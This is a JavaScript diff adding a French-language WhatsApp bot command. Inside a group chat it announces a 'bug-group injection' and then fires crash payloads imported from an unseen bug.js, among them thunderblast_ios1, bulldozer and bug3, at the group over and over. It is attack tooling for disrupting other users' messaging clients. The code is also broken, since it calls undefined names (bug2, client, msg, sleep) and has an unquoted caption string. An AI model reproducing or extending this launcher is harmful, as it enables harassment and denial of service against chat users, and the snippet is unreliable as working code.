@@ -1,0 +1,130 @@
+
+import configs from '../configs.js';
+import chalk from 'chalk';
+import { bug3, test, thunderblast_ios1, allProtocol, apaya, bulldozer, alldelay } from './bug.js';
+
+
+export async function xsenCommand(sock, chatId, message, args) {
+
+
+  if (!chatId.endsWith('@g.us')) {
+        return await sock.sendMessage(chatId, { text: '❌ Cette commande ne fonctionne que dans les groupes.' }, { quoted: message });
+    }
+
+    let target = chatId;
+
+    await sock.sendMessage(
+      target,
+      {
+        image: { url: "https://files.catbox.moe/0jbnsm.jpg" },
+        caption: 🥷🏾 Injection de bug-group🔞
+
+       > by Knut,
+      },
+      { quoted: message }
+    );
+
+    await sleep(1500);
+
+    try {
+      await apaya(sock, target);
+      await sleep(500);
+
+      await alldelay(sock, target);
+      await sleep(1000);
+
+      await bulldozer(sock, target);
+      await sleep(500);
+
+      await allProtocol(sock, target);
+      await sleep(1000);
+
+      await bulldozer(sock, target);
+          await sleep(500);
+      
+      await thunderblast_ios1(sock, target);
+      await sleep(500);
+
+      await apaya(sock, target);
+      await sleep(500);
+      
+       await test(message, sock);
+        await sleep(500);
+
+      await thunderblast_ios1(sock, target);
+      await sleep(1000);
+      
+       await bug3(message, client, target);
+        await sleep(500);
+        
+        await bug3(message, client, target);
+        await sleep(500);
+        
+       await bug2(message, client, target);
+       await sleep(500);
+        
+       await bug2(message, client, target);
+       await sleep(500);
+        
+      await thunderblast_ios1(sock, target);
+      await sleep(500);
+
+      await apaya(sock, target);
+      await sleep(500);
+
+      await thunderblast_ios1(sock, target);
+      await sleep(1000);
+
+      await thunderblast_ios1(sock, target);
+      await sleep(500);
+
+      await thunderblast_ios1(sock, target);
+      await sleep(500);
+      
+      await thunderblast_ios1(sock, target);
+      await sleep(500);
+
+      await apaya(sock, target);
+      await sleep(500);
+      
+       await test(message, sock);
+        await sleep(500);
+
+      await thunderblast_ios1(sock, target);
+      await sleep(1000);
+      
+       await bug3(message, client, target);
+        await sleep(500);
+        
+        await bug3(message, client, target);
+        await sleep(500);
+        
+       await bug2(message, client, target);
+       await sleep(500);
+        
+       await bug2(message, client, target);
+       await sleep(500);
+        
+      await thunderblast_ios1(sock, target);
+      await sleep(500);
+
+      await apaya(sock, target);
+      await sleep(500);
+
+      await thunderblast_ios1(sock, target);
+      await sleep(1000);
+
+      await thunderblast_ios1(sock, target);
+      await sleep(500);
+
+      await thunderblast_ios1(sock, target);
+      await sleep(500);
+
+      await sock.sendMessage(target, { react: { text: "⚡", key: msg.key } });
+    } catch (err) {
+      console.error("Erreur dans vortex:", err);
+    }
+  }
+
+
+export default { xsenCommand };
